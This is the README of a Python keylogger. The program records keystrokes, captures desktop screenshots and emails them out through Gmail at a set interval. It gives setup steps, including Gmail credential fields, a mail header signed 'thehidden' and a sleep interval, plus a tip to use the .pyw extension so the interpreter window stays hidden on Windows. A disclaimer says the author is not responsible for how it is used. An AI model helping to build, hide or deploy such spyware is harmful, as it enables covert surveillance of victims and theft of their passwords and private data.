# A brief introduction
It is not my responsibility what you will do 
with this program. My compromise is just to share
the knowledge and of course, by curiosity. 

A simple powerful Keylogger written in Python, this 
program allows you to take a screenshots from 
your desktop, record the keybord and send data 
via Gmail.   

## Notes
If the Keylogger is running on Windows it could be
possible to add the extension ".pyw" instead of ".py" for hide the 
Python interpreter. 

You could configure the argument in sleep function for change 
the time interval to take a screenshot, recording the keyboard and sending 
the mail.

# How does it works?
```
https://www.youtube.com/watch?v=-gM-zJJnIeA&feature=youtu.be
```


# Requeriments 
Make sure to have installed the next modules:

* Python 3, I don't know if the program run with Python 2.
* smtplib
* keyboard 
* PILLOW 

# Before to run
Be sure to cofigure the next parts of code:

* If you wish, configure some parameters into the script "e.py" , like 'Subject' and 'From'.


```
# Built a mail
mail = MIMEMultipart()
mail['Subject'] = 'MyLogTest'
mail['From'] = 'thehidden'
mail['To'] = to_addr
```

* Inside the script "thehidden.py".

```
your_mail = 'yourEmailAddress@gmail.com'
passw='your password'
```
 * Then, establish the interval time to take a screenshot, recording the keyboard and sending the mail., if you want. 
```
sleep(180)
```

# Limitations
The script works only on Windows or OS X. 

## Have fun!
